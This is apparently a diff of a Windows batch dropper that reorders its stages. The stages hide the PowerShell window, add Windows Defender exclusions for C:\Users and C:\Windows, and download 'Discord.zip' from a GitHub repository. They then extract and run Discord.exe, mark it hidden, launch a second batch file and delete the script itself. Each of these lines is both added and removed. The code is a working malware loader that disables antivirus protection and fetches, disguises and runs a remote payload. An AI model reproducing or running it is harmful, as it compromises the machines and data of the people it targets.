@@ -44,11 +44,10 @@ del "%~f0" & exit
 
 powershell -window hidden -command ""
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.zip' -OutFile Discord.zip"
-tar -xf Discord.zip
-del Discord.zip
-start Discord.exe
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows
+
+start C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
 
 del "%~f0" & exit
 
@@ -60,10 +59,11 @@ del "%~f0" & exit
 
 powershell -window hidden -command ""
 
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows
-
-start C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.zip' -OutFile Discord.zip"
+tar -xf Discord.zip
+del Discord.zip
+start Discord.exe
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
 
 del "%~f0" & exit
 
